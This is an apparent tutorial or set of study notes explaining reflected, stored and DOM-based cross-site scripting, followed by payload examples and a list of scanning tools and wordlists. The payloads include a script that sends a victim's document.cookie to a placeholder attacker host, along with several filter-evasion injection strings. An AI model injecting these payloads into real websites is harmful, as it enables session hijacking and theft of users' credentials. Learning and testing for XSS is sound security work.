
**Improve with:** 

**Cross-Site Scripting (XSS)** is a web vulnerability that allows an attacker to execute JavaScript code directly within a web application. This is dangerous because it can lead to various types of attacks such as session hijacking, stealing credentials, redirection to malicious sites, and executing actions on behalf of a victim.

There are three main types of XSS: **Reflected XSS**, **Stored XSS**, and **DOM-Based XSS**. While there are other variations, let’s focus on the core types.

### Reflected XSS

This is generally the least dangerous type of XSS, but it can still pose a real threat. It’s called _reflected_ because the payload is not stored on the server — instead, it’s reflected back in the response and executed when a victim clicks a crafted link.

Reflected XSS only works when triggered by the user, which means the attacker must deliver the payload (usually via a URL) to the victim. That’s why XSS in URLs can be particularly risky.

---
### Stored XSS

Stored XSS is the most severe type. In this case, the malicious code is saved on the server (e.g., in a database) and automatically delivered to users who view the affected content.

Imagine a basic website with a comment section. If the application doesn’t properly sanitize user input, an attacker can inject malicious JavaScript into a comment. This script will be stored and later executed when other users load the page, allowing the attacker to steal credentials, dump credit cards, hijack sessions, redirect users, and more.

---
### DOM-Based XSS

As the name suggests, DOM-Based XSS happens when the attack is triggered by how the application’s front-end JavaScript handles input. It usually involves manipulating the HTML DOM using user-controllable data.

Unlike reflected or stored XSS, this type happens entirely on the client-side — the malicious input never touches the server. It’s often found in cases where JavaScript functions like `document.write`, `innerHTML`, or `location.search` are used without validation.

```js
// Common vulnerable tags and JavaScript methods
document.write         // Writes raw HTML into the page — can trigger events like onload or onclick
location.search        // Retrieves URL parameters — injecting a payload can trigger JS execution
innerHTML              // Inserts HTML content — can lead to onload/onerror execution
```

---

```html
<!--SOME STORAGE PAYLOADS EXAMPLES-->
<script>
new Image().src = "http://malicious-site.com/steal?cookie=" + document.cookie
</script>

<svg otherEvents=1>
<img src=1 onerror="alert('Stored XSS')">
<iframe src="http://malicious.com/"></iframe>
```

```html
<!--SOME PAYLOADS EXAMPLES-->
<!--Basics-->
<svg onload="alert(1)">
<xss onload="javascript:confirm(2)"><xss>
nx"><svg/onload=alert(1)>
src="javascript:alert('xss')"/>
"><svg onload="console.log('look at the console!')">

<!--Out of box -->
xxx://14.rs
xxx//14.rs"></><body/onpageshow"
"><svg onload="alert(1)//"
sxc<</>ob</>je</>ct</>/data=//14.rs>
xxx"><object/data=//14.rs>
"><iframe src=javascript:alert("EASY-XSS");>.jsp
ssx"><srv/onload=alert`"SSX"`>x
```

---

Here are some great tools you can use when detecting or exploiting XSS vulnerabilities:
- **Burp Suite** – Especially useful with _Intruder_ and a good XSS payload wordlist.
- **Dalfox** – A powerful XSS scanning tool designed for automation and accuracy.
- **XSStrike** – An advanced XSS detection suite with fuzzing and payload crafting capabilities.
    
- **Recommended Wordlists:**
	- `/usr/share/wordlists/seclists/Fuzzing/XSS/human-friendly/` – Human-readable XSS payloads.
	- `/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/` – Payloads optimized for automated tools.
	- sudo apt install seclists -y - To install the infosec wordlists on kali linux
 

**Tips:** test use more then one tool, it can mitigate false positives or detect what other tool doesn't.


---


## GENERATING IMPACT...

